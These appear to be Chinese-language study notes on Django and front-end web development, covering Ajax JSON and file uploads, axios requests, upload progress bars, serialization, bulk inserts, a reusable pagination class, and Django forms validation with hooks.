# 可以朝后端发送post请求的方式
	"""
	1.form表单
	2.ajax请求
	""" 
"""
前后端传输数据的编码格式
	urlencoded
	formdata
	json
"""
# 研究form表单
'''
## 第一种
  默认的数据编码格式是：aplication/x-www-form-urlencoded
  数据格式:username=jason&password=123
  django后端针对符合urlencoded编码格式的数据都会自动帮你解析封装到request.POST中
  username=jason&password=123	>>> request.POST
 ## 第二种
  如果你把编码格式改成formdata，那么针对普通的键值对还是解析到request.POST中而将文件解析到request.FILES中
  
  form表单是没有办法发送json格式数据的
'''
# 研究ajax
'''
  默认的编码格式也是urlencoded
  数据格式:username=jason&age=20
  django后端针对符合urlencoded编码格式的数据都会自动帮你解析封装到request.POST中
  username=jason&age=20	>>> request.POST
'''
```

### 16-3 Ajax发送JSON格式

```javascript
/*
前后端传输数据的时候一定要确保编码格式跟数据真正的格式是一致的
不要骗人家!!!

{"username":"jason","age":25}  
	在request.POST里面肯定找不到
	
	django针对json格式的数据 不会做任何的处理 
	
request对象方法补充
	request.is_ajax()
		判断当前请求是否是ajax请求 返回布尔值

*/
<script>
    $('#d1').click(function () {
        $.ajax({
            url:'',
            type:'post',
            data:JSON.stringify({'username':'jason','age':25}),
            contentType:'application/json',  // 指定编码格式
            success:function () {

            }
        })
    })
</script>
/*
ajax发送json格式数据需要注意点
	1.contentType参数指定成:application/json
	2.数据是真正的json格式数据
	3.django后端不会帮你处理json格式数据需要你自己去request.body获取并处理
*/
```

python后端解析JSON数据

```python
json_bytes = request.body
json_str = json_bytes.decode('utf-8')
json_dict = json.loads(json_str)

# json.loads括号内如果传入了一个二进制格式的数据那么内部自动解码再反序列化
json_dict = json.loads(json_bytes)
        
```

### 16-4 Ajax发送文件

#### 4-1 笔记上的方法

```python
"""
ajax发送文件需要借助于js内置对象FormData

"""
<script>
    // 点击按钮朝后端发送普通键值对和文件数据
    $('#d4').on('click',function () {
        // 1 需要先利用FormData内置对象
        let formDateObj = new FormData();
        // 2 添加普通的键值对
        formDateObj.append('username',$('#d1').val());
        formDateObj.append('password',$('#d2').val());
        // 3 添加文件对象
        formDateObj.append('myfile',$('#d3')[0].files[0])
        // 4 将对象基于ajax发送给后端
        $.ajax({
            url:'',
            type:'post',
            data:formDateObj,  // 直接将对象放在data后面即可

            // ajax发送文件必须要指定的两个参数
            contentType:false,  // 不需使用任何编码 django后端能够自动识别formdata对象
            processData:false,  // 告诉你的浏览器不要对你的数据进行任何处理

            success:function (args) {
            }
        })


    })
</script>

def ab_file(request):
    if request.is_ajax():
        if request.method == 'POST':
            print(request.POST)
            print(request.FILES)
    return render(request,'ab_file.html')
  
"""
总结:
	1.需要利用内置对象FormData
	   // 2 添加普通的键值对
        formDateObj.append('username',$('#d1').val());
        formDateObj.append('password',$('#d2').val());
        // 3 添加文件对象
        formDateObj.append('myfile',$('#d3')[0].files[0])
	2.需要指定两个关键性的参数
	   contentType:false,  // 不需使用任何编码 django后端能够自动识别formdata对象
        processData:false,  // 告诉你的浏览器不要对你的数据进行任何处理
	3.django后端能够直接识别到formdata对象并且能够将内部的普通键值自动解析并封装到request.POST中 文件数据自动解析并封装到request.FILES中
"""
```

#### 4-2 原生JS实现文件上传

```javascript
// 新版 XMLHttpRequest 对象，不仅可以发送文本信息，还可以上传文件。
实现步骤：
① 定义 UI 结构
② 验证是否选择了文件
③ 向 FormData 中追加文件
④ 使用 xhr 发起上传文件的请求
⑤ 监听 onreadystatechange 事件

1. 定义UI结构
    <!-- 1. 文件选择框 -->
    <input type="file" id="file1" />
    <!-- 2. 上传按钮 -->
    <button id="btnUpload">上传文件</button>
    <br />
    <!-- 3. 显示上传到服务器上的图片 -->
    <img src="" alt="" id="img" width="800" />
    
2. 验证是否选择了文件
    // 1. 获取上传文件的按钮
    var btnUpload = document.querySelector('#btnUpload')
    // 2. 为按钮添加 click 事件监听
    btnUpload.addEventListener('click', function() {
    // 3. 获取到选择的文件列表
    var files = document.querySelector('#file1').files
    if (files.length <= 0) {
    return alert('请选择要上传的文件！')
    }
    // ...后续业务逻辑
    })

3. 向FormData中追加文件
    // 1. 创建 FormData 对象
    var fd = new FormData()
    // 2. 向 FormData 中追加文件
    fd.append('avatar', files[0])

4. 使用 xhr 发起上传文件的请求
    // 1. 创建 xhr 对象
    var xhr = new XMLHttpRequest()
    // 2. 调用 open 函数，指定请求类型与URL地址。其中，请求类型必须为 POST
    xhr.open('POST', 'http://www.liulongbin.top:3006/api/upload/avatar')
    // 3. 发起请求
    xhr.send(fd)


5. 监听onreadystatechange事件
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var data = JSON.parse(xhr.responseText)
            if (data.status === 200) { // 上传文件成功
            // 将服务器返回的图片地址，设置为 <img> 标签的 src 属性
            document.querySelector('#img').src = 'http://www.liulongbin.top:3006' + data.url
            } else { // 上传文件失败
            console.log(data.message)
            }
        }
    }
```

#### 4-3 jQuery实现文件上传

```JavaScript
1. 定义UI结构
    <!-- 导入 jQuery -->
    <script src="./lib/jquery.js"></script>
    <!-- 文件选择框 -->
    <input type="file" id="file1" />
    <!-- 上传文件按钮 -->
    <button id="btnUpload">上传</button>

2. 验证是否选择了文件
    $('#btnUpload').on('click', function() {
        // 1. 将 jQuery 对象转化为 DOM 对象，并获取选中的文件列表
        var files = $('#file1')[0].files
        // 2. 判断是否选择了文件
        if (files.length <= 0) {
        return alert('请选择图片后再上传！‘)
        }
    })
        
3. 向FormData中追加文件
    // 向 FormData 中追加文件
    var fd = new FormData()
    fd.append('avatar', files[0])

        
4. 使用jQuery发起上传文件的请求
    $.ajax({
        method: 'POST',
        url: 'http://www.liulongbin.top:3006/api/upload/avatar',
        data: fd,
        // 不修改 Content-Type 属性，使用 FormData 默认的 Content-Type 值
        contentType: false,
        // 不对 FormData 中的数据进行 url 编码，而是将 FormData 数据原样发送到服务器
        processData: false,
        success: function(res) {
            console.log(res)
        }
    })
```

### 16-5 显示文件上传的进度

```javascript
// 新版本的 XMLHttpRequest 对象中，可以通过监听 xhr.upload.onprogress 事件，来获取到文件的上传进度。
语法格式如下：
// 创建 XHR 对象
var xhr = new XMLHttpRequest()
// 监听 xhr.upload 的 onprogress 事件
xhr.upload.onprogress = function(e) {
// e.lengthComputable 是一个布尔值，表示当前上传的资源是否具有可计算的长度
if (e.lengthComputable) {
    // e.loaded 已传输的字节
    // e.total 需传输的总字节
    var percentComplete = Math.ceil((e.loaded / e.total) * 100)
    }
}


1. 导入需要的库
    <link rel="stylesheet" href="./lib/bootstrap.css" />
    <script src="./lib/jquery.js"></script>

2. 基于Bootstrap渲染进度条
    <!-- 进度条 -->
    <div class="progress" style="width: 500px; margin: 10px 0;">
        <div class="progress-bar progress-bar-info progress-barstriped active" id="percent" style="width: 0%">
        0%
        </div>
    </div>

3. 监听上传进度的事件
    xhr.upload.onprogress = function(e) {
        if (e.lengthComputable) {
        // 1. 计算出当前上传进度的百分比
        var percentComplete = Math.ceil((e.loaded / e.total) * 100)
        $('#percent')
        // 2. 设置进度条的宽度
        .attr('style', 'width:' + percentComplete + '%')
        // 3. 显示当前的上传进度百分比
        .html(percentComplete + '%')
        }
    }

4. 监听上传完成的事件
    xhr.upload.onload = function() {
        $('#percent')
        // 移除上传中的类样式
        .removeClass()
        // 添加上传完成的类样式
        .addClass('progress-bar progress-bar-success')
    }
```

### 16-6  jQuery实现loading效果

```js
1. ajaxStart(callback)
    //Ajax 请求开始时，执行 ajaxStart 函数。可以在 ajaxStart 的 callback 中显示 loading 效果，示例代码如下：
        // 自 jQuery 版本 1.8 起，该方法只能被附加到文档
        $(document).ajaxStart(function() {
            $('#loading').show()
        })
        注意： $(document).ajaxStart() 函数会监听当前文档内所有的 Ajax 请求。


2. ajaxStop(callback)
    // Ajax 请求结束时，执行 ajaxStop 函数。可以在 ajaxStop 的 callback 中隐藏 loading 效果，示例代码如下：
        // 自 jQuery 版本 1.8 起，该方法只能被附加到文档
        $(document).ajaxStop(function() {
            $('#loading').hide()
        })
```

### 16-7   Axios

#### 7.1 axios发起GET请求

```js
// axios 发起 get 请求的语法：
axios.get('url', { params: { /*参数*/ } }).then(callback)

//具体的请求示例如下：
    // 请求的 URL 地址
    var url = 'http://www.liulongbin.top:3006/api/get'
    // 请求的参数对象
    var paramsObj = { name: 'zs', age: 20 }
    // 调用 axios.get() 发起 GET 请求
    axios.get(url, { params: paramsObj }).then(function(res) {
        // res.data 是服务器返回的数据
        var result = res.data
        console.log(res)
    })
```



#### 7.2 直接使用axios发起POST请求

```js
// axios 发起 post 请求的语法：
    axios.post('url', { /*参数*/ }).then(callback)

    具体的请求示例如下：
    // 请求的 URL 地址
    var url = 'http://www.liulongbin.top:3006/api/post'
    // 要提交到服务器的数据
    var dataObj = { location: '北京', address: '顺义' }
    // 调用 axios.post() 发起 POST 请求
    axios.post(url, dataObj).then(function(res) {
        // res.data 是服务器返回的数据
        var result = res.data
        console.log(result)
    })

```

#### 7,3 直接使用axios发起请求

```js
// axios 也提供了类似于 jQuery 中 $.ajax() 的函数，语法如下：
    axios({
    method: '请求类型',
    url: '请求的URL地址',
    data: { /* POST数据 */ },
    params: { /* GET参数 */ }
    }) .then(callback)



1. 直接使用axios发起GET请求
    axios({
        method: 'GET',
        url: 'http://www.liulongbin.top:3006/api/get',
        params: { // GET 参数要通过 params 属性提供
        name: 'zs',
        age: 20
        }
        }).then(function(res) {
        console.log(res.data)
    })

2. 直接使用axios发起POST请求
    axios({
        method: 'POST',
        url: 'http://www.liulongbin.top:3006/api/post',
        data: { // POST 数据要通过 data 属性提供
        bookname: '程序员的自我修养',
        price: 666
        }
        }).then(function(res) {
        console.log(res.data)
    })
```

### 16-8 django自带的序列化组件(drf做铺垫)

```python
"""
如果发现你可以直接使用MySQL但是无法使用sqlite3
不要慌张不要恐惧 你只需要按照之前MySQL的操作将sqlite3的驱动装一下即可
"""
# 需求:在前端给我获取到后端用户表里面所有的数据 并且要是列表套字典
import json
from django.http import JsonResponse
from django.core import serializers
def ab_ser(request):
    user_queryset = models.User.objects.all()
    # [{},{},{},{},{}]
    # user_list = []
    # for user_obj in user_queryset:
    #     tmp = {
    #         'pk':user_obj.pk,
    #         'username':user_obj.username,
    #         'age':user_obj.age,
    #         'gender':user_obj.get_gender_display()
    #     }
    #     user_list.append(tmp)
    # return JsonResponse(user_list,safe=False)
    # return render(request,'ab_ser.html',locals())

    # 序列化
    res = serializers.serialize('json',user_queryset)
    """会自动帮你将数据变成json格式的字符串 并且内部非常的全面"""
    return HttpResponse(res)
"""
[
 {"pk": 1, "username": "jason", "age": 25, "gender": "male"}, 
 {"pk": 2, "username": "egon", "age": 31, "gender": "female"},
 {"pk": 3, "username": "kevin", "age": 32, "gender": "others"}, 
 {"pk": 4, "username": "tank", "age": 40, "gender": 4}
 ]
前后端分离的项目
    作为后端开发的你只需要写代码将数据处理好
    能够序列化返回给前端即可 
        再写一个接口文档 告诉前端每个字段代表的意思即可
        
        
[
{   "model": "app01.user", 
    "pk": 1, 
    "fields": {"username": "jason", "age": 25, "gender": 1}}, 
    
{   "model": "app01.user", 
    "pk": 2, 
    "fields": {"username": "egon", "age": 31, "gender": 2}}, 
    
{   "model": "app01.user", 
    "pk": 3, 
    "fields": {"username": "kevin", "age": 32, "gender": 3}},
     
{   "model": "app01.user", 
    "pk": 4, 
    "fields": {"username": "tank", "age": 40, "gender": 4}}
]
写接口就是利用序列化组件渲染数据然后写一个接口文档 该交代交代一下就完事
"""
```

### 16-9 ajax结合sweetalert

```javascript
/*
自己要学会如何拷贝
学会基于别人的基础之上做修改
研究各个参数表示的意思 然后找葫芦画瓢
*/
<script>
    $('.del').on('click',function () {
        // 先将当前标签对象存储起来
        let currentBtn = $(this);
        // 二次确认弹框
        swal({
          title: "你确定要删吗?",
          text: "你可要考虑清除哦，可能需要拎包跑路哦!",
          type: "warning",
          showCancelButton: true,
          confirmButtonClass: "btn-danger",
          confirmButtonText: "是的，老子就要删!",
          cancelButtonText: "算了,算了!",
          closeOnConfirm: false,
          closeOnCancel: false,
          showLoaderOnConfirm: true
        },
        function(isConfirm) {
          if (isConfirm) {
                // 朝后端发送ajax请求删除数据之后 再弹下面的提示框
                $.ajax({
                    {#url:'/delete/user/' + currentBtn.attr('delete_id'),  // 1 传递主键值方式1#}
                    url:'/delete/user/',  // 2 放在请求体里面
                    type:'post',
                    data:{'delete_id':currentBtn.attr('delete_id')},
                    success:function (args) {  // args = {'code':'','msg':''}
                        // 判断响应状态码 然后做不同的处理
                        if(args.code === 1000){
                            swal("删了!", args.msg, "success");
                            // 1.lowb版本 直接刷新当前页面
                            {#window.location.reload()#}
                            // 2.利用DOM操作 动态刷新
                            currentBtn.parent().parent().remove()
                        }else{
                            swal('完了','出现了位置的错误','info')
                        }
                    }

                })

          } else {
            swal("怂逼", "不要说我认识你", "error");
          }
        });
    })

</script>
```

### 16-10 批量插入

```python
def ab_pl(request):
    # 先给Book插入一万条数据
    # for i in range(10000):
    #     models.Book.objects.create(title='第%s本书'%i)
    # # 再将所有的数据查询并展示到前端页面
    book_queryset = models.Book.objects.all()

    # 批量插入
    book_list = []
    for i in range(100000):
        book_obj = models.Book(title='第%s本书'%i)
        book_list.append(book_obj)
    models.Book.objects.bulk_create(book_list)
    """
    当你想要批量插入数据的时候 使用orm给你提供的bulk_create能够大大的减少操作时间
    :param request: 
    :return: 
    """
    return render(request,'ab_pl.html',locals())
```

### 16-11 分页器

#### 11-1 基础班

```python
"""
总数据100 每页展示10 需要10
总数据101 每页展示10 需要11
总数据99 每页展示10  需要10

如何通过代码动态的计算出到底需要多少页？

在制作页码个数的时候 一般情况下都是奇数个		符合中国人对称美的标准
"""
# 分页
    book_list = models.Book.objects.all()

    # 想访问哪一页
    current_page = request.GET.get('page',1)  # 如果获取不到当前页码 就展示第一页
    # 数据类型转换
    try:
        current_page = int(current_page)
    except Exception:
        current_page = 1
    # 每页展示多少条
    per_page_num = 10
    # 起始位置
    start_page = (current_page - 1) * per_page_num
    # 终止位置
    end_page = current_page * per_page_num

    # 计算出到底需要多少页
    all_count = book_list.count()

    page_count, more = divmod(all_count, per_page_num)
    if more:
        page_count += 1

    page_html = ''
    xxx = current_page
    if current_page < 6:
        current_page = 6
    for i in range(current_page-5,current_page+6):
        if xxx == i:
            page_html += '<li class="active"><a href="?page=%s">%s</a></li>'%(i,i)
        else:
            page_html += '<li><a href="?page=%s">%s</a></li>'%(i,i)



    book_queryset =  book_list[start_page:end_page]
    
"""
django中有自带的分页器模块 但是书写起来很麻烦并且功能太简单
所以我们自己想法和设法的写自定义分页器

上述推导代码你无需掌握 只需要知道内部逻辑即可

我们基于上述的思路 已经封装好了我们自己的自定义分页器 
之后需要使用直接拷贝即可
"""
```

#### 11-2 现成的代码（直接用）

##### utils.mypage.py

```Python
class Pagination(object):
    def __init__(self, current_page, all_count, per_page_num=10, pager_count=11):
        """
        封装分页相关数据
        :param current_page: 当前页
        :param all_count:    数据库中的数据总条数
        :param per_page_num: 每页显示的数据条数
        :param pager_count:  最多显示的页码个数
        """
        try:
            current_page = int(current_page)
        except Exception as e:
            current_page = 1

        if current_page < 1:
            current_page = 1

        self.current_page = current_page

        self.all_count = all_count
        self.per_page_num = per_page_num

        # 总页码
        all_pager, tmp = divmod(all_count, per_page_num)
        if tmp:
            all_pager += 1
        self.all_pager = all_pager

        self.pager_count = pager_count
        self.pager_count_half = int((pager_count - 1) / 2)

    @property
    def start(self):
        return (self.current_page - 1) * self.per_page_num

    @property
    def end(self):
        return self.current_page * self.per_page_num

    def page_html(self):
        # 如果总页码 < 11个：
        if self.all_pager <= self.pager_count:
            pager_start = 1
            pager_end = self.all_pager + 1
        # 总页码  > 11
        else:
            # 当前页如果<=页面上最多显示11/2个页码
            if self.current_page <= self.pager_count_half:
                pager_start = 1
                pager_end = self.pager_count + 1

            # 当前页大于5
            else:
                # 页码翻到最后
                if (self.current_page + self.pager_count_half) > self.all_pager:
                    pager_end = self.all_pager + 1
                    pager_start = self.all_pager - self.pager_count + 1
                else:
                    pager_start = self.current_page - self.pager_count_half
                    pager_end = self.current_page + self.pager_count_half + 1

        page_html_list = []
        # 添加前面的nav和ul标签
        page_html_list.append('''
                    <nav aria-label='Page navigation>'
                    <ul class='pagination'>
                ''')
        first_page = '<li><a href="?page=%s">首页</a></li>' % (1)
        page_html_list.append(first_page)

        if self.current_page <= 1:
            prev_page = '<li class="disabled"><a href="#">上一页</a></li>'
        else:
            prev_page = '<li><a href="?page=%s">上一页</a></li>' % (self.current_page - 1,)

        page_html_list.append(prev_page)

        for i in range(pager_start, pager_end):
            if i == self.current_page:
                temp = '<li class="active"><a href="?page=%s">%s</a></li>' % (i, i,)
            else:
                temp = '<li><a href="?page=%s">%s</a></li>' % (i, i,)
            page_html_list.append(temp)

        if self.current_page >= self.all_pager:
            next_page = '<li class="disabled"><a href="#">下一页</a></li>'
        else:
            next_page = '<li><a href="?page=%s">下一页</a></li>' % (self.current_page + 1,)
        page_html_list.append(next_page)

        last_page = '<li><a href="?page=%s">尾页</a></li>' % (self.all_pager,)
        page_html_list.append(last_page)
        # 尾部添加标签
        page_html_list.append('''
                                           </nav>
                                           </ul>
                                       ''')
        return ''.join(page_html_list)
```

##### views.py

```Python
from django.shortcuts import render,HttpResponse
from app01 import models


from utils.mypage import Pagination

def ab_pl(request):

    book_queryset = models.Book.objects.all()
    current_page = request.GET.get('page',1)
    all_count = book_queryset.count()

    # 1 传值生成对象
    page_obj = Pagination(current_page=current_page,all_count=all_count)
    # 2 直接对总数据进行切片操作
    page_queryset = book_queryset[page_obj.start:page_obj.end]
    # 3 将page_queryset传递到页面 替换之前的book_queryset
    return render(request,'ab_pl.html',locals())
"""
per_page_num = 10
current_page                start_page                  end_page
    1                           0                           10
    2                           10                          20
    3                           20                          30
    4                           30                          40


per_page_num = 5
current_page                start_page                  end_page
    1                           0                           5
    2                           5                           10
    3                           10                          15
    4                           15                          20
    
start_page = (current_page - 1) * per_page_num
end_page = current_page * per_page_num
"""
```

##### ab_pl.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.bootcss.com/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
{% for book_obj in page_queryset %}
    <p>{{ book_obj.title }}</p>
    <nav aria-label="Page navigation">
</nav>
{% endfor %}
{#利用自定义分页器直接显示分页器样式#}
{{ page_obj.page_html|safe }}

</body>
</html>
```



### 16-12 自定义分页器的拷贝及使用

```python
"""
当我们需要使用到非django内置的第三方功能或者组件代码的时候
我们一般情况下会创建一个名为utils文件夹 在该文件夹内对模块进行功能性划分
	utils可以在每个应用下创建 具体结合实际情况

我们到了后期封装代码的时候 不再局限于函数
还是尽量朝面向对象去封装

我们自定义的分页器是基于bootstrap样式来的 所以你需要提前导入bootstrap
	bootstrap 版本 v3
	jQuery		版本 v3
"""
# 后端
book_queryset = models.Book.objects.all()
current_page = request.GET.get('page',1)
all_count = book_queryset.count()
# 1 传值生成对象
page_obj = Pagination(current_page=current_page,all_count=all_count)
# 2 直接对总数据进行切片操作
page_queryset = book_queryset[page_obj.start:page_obj.end]
# 3 将page_queryset传递到页面 替换之前的book_queryset


# 前端
{% for book_obj in page_queryset %}
    <p>{{ book_obj.title }}</p>
    <nav aria-label="Page navigation">
</nav>
{% endfor %}
{#利用自定义分页器直接显示分页器样式#}
{{ page_obj.page_html|safe }}
  
"""
你们只需要掌握如何拷贝使用 以及大致的推导思路即可
"""
```



## 12-17 表单的基本使用

### 17.1 <form>标签的属性

![image-20230701183418411](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701183418411.png)

##### 1-1  target

![image-20230701183439173](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701183439173.png)

##### 1-2 enctype

```JS
// 在涉及到文件上传的操作时，必须将 enctype 的值设置为 multipart/form-data
// 如果表单的提交不涉及到文件上传操作，则直接将 enctype 的值设置为 application/x-www-form-urlencoded 即可！
```

![image-20230701183505975](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230701183505975.png)

### 17-2 表单的同步提交及缺点

```js
1. 什么是表单的同步提交
	// 通过点击 submit 按钮，触发表单提交的操作，从而使页面跳转到 action URL 的行为，叫做表单的同步提交。
2，表单同步提交的缺点
	// 页面会发生跳转
	// 页面之前的状态和数据会丢失
3，解决方案：表单只负责采集数据，Ajax 负责将数据提交到服务器。


```

### 17-3 通过Ajax提交表单数据

#### 3.1 监听表单提交事件

```js
// 在 jQuery 中，可以使用如下两种方式，监听到表单的提交事件：

$('#form1').submit(function(e) {
    alert('监听到了表单的提交事件')
})

$('#form1').on('submit', function(e) {
    alert('监听到了表单的提交事件')
})
```

#### 3-2 阻止表单默认提交行为

```js
// 当监听到表单的提交事件以后，可以调用事件对象的 event.preventDefault() 函数，来阻止表单的提交和页面的跳转，示例代码如下：

$('#form1').submit(function(e) {
    // 阻止表单的提交和页面的跳转
    e.preventDefault()
})

$('#form1').on('submit', function(e) {
    // 阻止表单的提交和页面的跳转
    e.preventDefault()
})
```

#### 3-3 快速获取表单中的数据

##### serialize()函数

```js
// 为了简化表单中数据的获取操作，jQuery 提供了 serialize() 函数，其语法格式如下]

$(selector).serialize()

// serialize() 函数的好处：可以一次性获取到表单中的所有的数据。
// 注意：在使用 serialize() 函数快速获取表单数据时，必须为每个表单元素添加 name 属性！

<form id="form1">
<input type="text" name="username" />
<input type="password" name="password" />
<button type="submit">提交</button>
</form>

$('#form1').serialize()
// 调用的结果：
// username=用户名的值&password=密码的值

```

## 12-18 forms组件

### 18-1 前戏

```python
"""
写一个注册功能
	获取用户名和密码 利用form表单提交数据
	在后端判断用户名和密码是否符合一定的条件
		用户名中不能含有金瓶梅
		密码不能少于三位
	
	如何符合条件需要你将提示信息展示到前端页面
"""
def ab_form(request):
    back_dic = {'username':'','password':''}
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if '金瓶梅' in username:
            back_dic['username'] = '不符合社会主义核心价值观'
        if len(password) < 3:
            back_dic['password'] = '不能太短 不好!'
    """
    无论是post请求还是get请求
    页面都能够获取到字典 只不过get请求来的时候 字典值都是空的
    而post请求来之后 字典可能有值
    """
    return render(request,'ab_form.html',locals())

<form action="" method="post">
    <p>username:
        <input type="text" name="username">
        <span style="color: red">{{ back_dic.username }}</span>
    </p>
    <p>password:
        <input type="text" name="password">
        <span style="color: red">{{ back_dic.password }}</span>
    </p>
    <input type="submit" class="btn btn-info">
</form>


"""
1.手动书写前端获取用户数据的html代码						渲染html代码
2.后端对用户数据进行校验											 校验数据
3.对不符合要求的数据进行前端提示								展示提示信息

forms组件
	能够完成的事情
			1.渲染html代码
			2.校验数据
			3.展示提示信息

为什么数据校验非要去后端 不能在前端利用js直接完成呢？
	数据校验前端可有可无
	但是后端必须要有!!!
	
	因为前端的校验是弱不禁风的 你可以直接修改
	或者利用爬虫程序绕过前端页面直接朝后端提交数据
	
	购物网站	
		选取了货物之后 会计算一个价格发送给后端 如果后端不做价格的校验
		
		实际是获取到用户选择的所有商品的主键值
		然后在后端查询出所有商品的价格 再次计算一遍
		如果跟前端一致 那么完成支付如果不一致直接拒绝
"""
```

### 18-2  基本使用

```python
from django import forms
class MyForm(forms.Form):
    # username字符串类型最小3位最大8位
    username = forms.CharField(min_length=3,max_length=8)
    # password字符串类型最小3位最大8位
    password = forms.CharField(min_length=3,max_length=8)
    # email字段必须符合邮箱格式  xxx@xx.com
    email = forms.EmailField()
```

### 18-3 校验数据

```python
"""
1.测试环境的准备 可以自己拷贝代码准备
2.其实在pycharm里面已经帮你准备一个测试环境
	python console
"""
from app01 import views
# 1 将带校验的数据组织成字典的形式传入即可
	form_obj = views.MyForm({'username':'jason','password':'123','email':'123'})

# 2 判断数据是否合法，注意该方法只有在所有的数据全部合法的情况下才会返回True
	form_obj.is_valid() # False

# 3 查看所有校验通过的数据
	form_obj.cleaned_data ## {'username': 'jason', 'password': '123'}

# 4 查看所有不符合校验规则以及不符合的原因
	form_obj.errors
    {
      'email': ['Enter a valid email address.']
    }
    
# 5 校验数据只校验类中出现的字段 多传不影响 多传的字段直接忽略
form_obj = views.MyForm({'username':'jason','password':'123','email':'123@qq.com','hobby':'study'})
form_obj.is_valid()  ## True

# 6 校验数据 默认情况下 类里面所有的字段都必须传值
form_obj = views.MyForm({'username':'jason','password':'123'})
form_obj.is_valid()  # False

"""
也就意味着校验数据的时候 默认情况下数据可以多传但是绝不可能少传
"""
```

### 18-4 渲染标签

```python
"""
forms组件只会自动帮你渲染获取用户输入的标签(input select radio checkbox)
不能帮你渲染提交按钮
"""
def index(request):
    # 1 先产生一个空对象
    form_obj = MyForm()
    # 2 直接将该空对象传递给html页面
    return render(request,'index.html',locals())

# 前端利用空对象做操作
    <p> 第一种渲染方式:代码书写极少，封装程度太高 不便于后续的扩展 一般情况下只在本地测试使用</p>
    {{ form_obj.as_p }}
    {{ form_obj.as_ul }}
    {{ form_obj.as_table }}
    ## 上面三种写法三选一即可，就是不同的渲染方式
    <p>第二种渲染方式:可扩展性很强 但是需要书写的代码太多  一般情况下不用</p>
    <p>{{ form_obj.username.label }}:{{ form_obj.username }}</p>
    <p>{{ form_obj.password.label }}:{{ form_obj.password }}</p>
    <p>{{ form_obj.email.label }}:{{ form_obj.email }}</p>
    <p>第三种渲染方式(推荐使用):代码书写简单 并且扩展性也高</p>
    {% for form in form_obj %}
        <p>{{ form.label }}:{{ form }}</p>
    {% endfor %}
 
"""
label属性默认展示的是类中定义的字段首字母大写的形式
也可以自己修改 直接给字段对象加label属性即可
	 username = forms.CharField(min_length=3,max_length=8,label='用户名')
"""
```

### 18-5 展示提示信息

```python
"""
浏览器会自动帮你校验数据 但是前端的校验弱不禁风
如何让浏览器不做校验
	<form action="" method="post" novalidate>
"""

def index(request):
    # 1 先产生一个空对象
    form_obj = MyForm()
    if request.method == 'POST':
        # 获取用户数据并且校验
        """
        1.数据获取繁琐
        2.校验数据需要构造成字典的格式传入才行
        ps:但是request.POST可以看成就是一个字典
        """
        # 3.校验数据
        form_obj = MyForm(request.POST)
        # 4.判断数据是否合法
        if form_obj.is_valid():
            # 5.如果合法 操作数据库存储数据
            return HttpResponse('OK')
        # 5.不合法 有错误
    # 2 直接将该空对象传递给html页面
    return render(request,'index.html',locals())

## 前端页面渲染
{% for form in form_obj %}
        <p>
            {{ form.label }}:{{ form }}
            <span style="color: red">{{ form.errors.0 }}</span>
        </p>
{% endfor %}

## 如果不想让前端也进行校验，那么在form标签加一个novalidate

"""
1.必备的条件 get请求和post传给html页面对象变量名必须一样
2.forms组件当你的数据不合法的情况下 会保存你上次的数据 让你基于之前的结果进行修改
更加的人性化
"""
# 针对错误的提示信息还可以自己自定制
class MyForm(forms.Form):
    # username字符串类型最小3位最大8位
    username = forms.CharField(min_length=3,max_length=8,label='用户名',
                               error_messages={
                                   'min_length':'用户名最少3位',
                                   'max_length':'用户名最大8位',
                                   'required':"用户名不能为空"
                               }
                               )
    # password字符串类型最小3位最大8位
    password = forms.CharField(min_length=3,max_length=8,label='密码',
                               error_messages={
                                   'min_length': '密码最少3位',
                                   'max_length': '密码最大8位',
                                   'required': "密码不能为空"
                               }
                               )
    # email字段必须符合邮箱格式  xxx@xx.com
    email = forms.EmailField(label='邮箱',
                             error_messages={
                                 'invalid':'邮箱格式不正确',
                                 'required': "邮箱不能为空"
                             }
                             )
```

### 18-6 钩子函数(HOOK)

```python
"""
在特定的节点自动触发完成响应操作

钩子函数在forms组件中就类似于第二道关卡，能够让我们自定义校验规则

在forms组件中有两类钩子
	1.局部钩子
		当你需要给单个字段增加校验规则的时候可以使用
	2.全局钩子
  	当你需要给多个字段增加校验规则的时候可以使用
"""
# 实际案例

# 1.校验用户名中不能含有666				只是校验username字段  局部钩子

# 2.校验密码和确认密码是否一致			password confirm两个字段	全局钩子

# 钩子函数  在类里面书写方法即可
    # 局部钩子
    from django import forms
	class MyForm(forms.Form):
        # username字符串类型最小3位最大8位
        username = forms.CharField(min_length=3,max_length=8)
        # password字符串类型最小3位最大8位
        password = forms.CharField(min_length=3,max_length=8)
        # email字段必须符合邮箱格式  xxx@xx.com
        email = forms.EmailField()
    
        def clean_username(self):
            # 获取到用户名
            username = self.cleaned_data.get('username')
            if '666' in username:
                # 提示前端展示错误信息
                self.add_error('username','光喊666是不行滴～')
            # 将钩子函数钩去出来数据再放回去
            return username
        
        
	class MyForm(forms.Form):
        # username字符串类型最小3位最大8位
        username = forms.CharField(min_length=3,max_length=8)
        # password字符串类型最小3位最大8位
        password = forms.CharField(min_length=3,max_length=8)
        # email字段必须符合邮箱格式  xxx@xx.com
        email = forms.EmailField()	
        
        # 全局钩子
        def clean(self):
            password = self.cleaned_data.get('password')
            confirm_password = self.cleaned_data.get('confirm_password')
            if not confirm_password == password:
                self.add_error('confirm_password','两次密码不一致')
            # 将钩子函数钩出来数据再放回去
            return self.cleaned_data
```

### 18-7 forms组件其他参数及补充知识点

```python
label		字段名
error_messages  自定义报错信息
initial  默认值
required  控制字段是否必填
"""
1.字段没有样式
2.针对不同类型的input如何修改
	text
	password
	date
	radio
	checkbox
	...
"""
widget=forms.widgets.PasswordInput(attrs={'class':'form-control c1 c2'})
# 多个属性值的话 直接空格隔开即可

from django.core.validators import RegexValidator
# 第一道关卡里面还支持正则校验
validators=[
            RegexValidator(r'^[0-9]+$', '请输入数字'),
